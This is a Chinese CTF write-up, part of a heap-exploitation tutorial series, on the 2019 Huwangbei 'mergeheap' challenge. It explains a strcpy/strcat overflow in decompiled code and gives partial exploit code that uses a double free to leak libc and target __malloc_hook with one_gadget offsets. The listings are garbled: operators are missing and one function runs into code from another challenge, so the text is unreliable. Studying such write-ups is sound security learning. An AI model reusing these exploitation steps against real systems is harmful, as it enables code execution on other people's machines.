# pwn堆入门系列教程6
[pwn堆入门系列教程1](https://xz.aliyun.com/t/6087)  
[pwn堆入门系列教程2](https://xz.aliyun.com/t/6169)  
[pwn堆入门系列教程3](https://xz.aliyun.com/t/6252)  
[pwn堆入门系列教程4](https://xz.aliyun.com/t/6322)  
[pwn堆入门系列教程5](https://xz.aliyun.com/t/6377)
要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double
free，这些操作用上了
## 2019护网杯 mergeheap
我每次看到题目名字跟函数名字相同，我就知道点就在那个函数上，然而我当时已经看出这里有溢出了，然后调试的时候以为没覆盖到，原来只能覆盖到size，还是脑子不清晰，所以才会这样
### 功能分析
  1. 新建一个堆块
  2. 展示堆块内容
  3. 删除一个堆块
  4. 合并两个堆块内容
  5. 退出
乍一看就只有合并比较可疑了，通常堆题没合并，而题目又是mergeheap
### 漏洞点分析
    int sub_E29()
    {
      int i; // [rsp+8h] [rbp-18h]
      int v2; // [rsp+Ch] [rbp-14h]
      int v3; // [rsp+10h] [rbp-10h]
      int v4; // [rsp+1Ch] [rbp-4h]
      for ( i = 0; i  14 )
        return puts("full");
      printf("idx1:");
      v2 = sub_B8B();
      if ( v2  14 || !qword_2020A0[v2] )
        return puts("invalid");
      printf("idx2:");
      v3 = sub_B8B();
      if ( v3  14 || !qword_2020A0[v3] )
        return puts("invalid");
      v4 = dword_202060[v2] + dword_202060[v3];
      qword_2020A0[i] = malloc(v4);
      strcpy(qword_2020A0[i], qword_2020A0[v2]);
      strcat(qword_2020A0[i], qword_2020A0[v3]);
      dword_202060[i] = v4;
      return puts("Done");
    }
merge这里的strcpy跟strcat都是遇到\x00结束的，所以，我们如果将下一个堆块的pre_size当数据段来用的话，就可以复制到size部分，merge的时候会覆盖到下一个堆块的size，溢出覆盖size
    int sub_D72()
    {
      _DWORD *v0; // rax
      int v2; // [rsp+Ch] [rbp-4h]
      printf("idx:");
      v2 = sub_B8B();
      if ( v2 >= 0 && v2  0x63 || !*(&lifelist + v1) )
        {
          puts("Invalid choice");
          return 0;
        }
        *(_DWORD *)*(&lifelist + v1) = 0;
        free(*((void **)*(&lifelist + v1) + 1));
        puts("Successful , God !");
      }
      else
      {
        puts("No life in this lonely planet~ ");
      }
      return puts("\n");
    }
这里存在double free，free后为置空
### 漏洞利用过程
我是多次利用double
free然后成的,这道题说实话很坑，malloc_hook本地改成one_gadget是可以成功的，远程怎么打都打不上，后面学到一个骚操作，double
free触发malloc_hook？？？原理我也不清楚，不过确实远程拿到shell了
  1. 利用double free泄露地址
    ptr = 0x00000000006020E0-0x20-0x30-0x6
        add(0x30, "a", "0") #0
        add(0x30, "b", "1") #1
        delete(0) 
        delete(1)
        delete(0)
        add(0x30, p64(ptr), '2') #2
        add(0x30, 'a', '3') #3
        add(0x30, 'a', '4') #4
        add(0x30, 'a'*0x20 + 'b'*5 , '5')#5
        show()
        io.recvuntil("bbbbb")
        stdout_addr = u64(io.recvuntil("Level", drop=True).ljust(8, '\x00'))
        stdout_addr = hex(stdout_addr)[:-2]
        stdout_addr = int(stdout_addr, 16)
        io.success("stdout_addr: 0x%x" % stdout_addr)
        libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
        realloc_addr = libc_base + libc.symbols['__libc_realloc']
        one_gadget = libc_base + 0x45216 
        one_gadget = libc_base + 0x4526a 
        one_gadget = libc_base + 0xf02a4 
        one_gadget = libc_base + 0xf1147
        malloc_hook = libc_base + libc.symbols['__malloc_hook']
        ptr = malloc_hook-0x20-0x3
  1. 利用double free改写地址
    add(0x60, "a", "6")#6
        add(0x60, "b", "7")#7
        delete(6)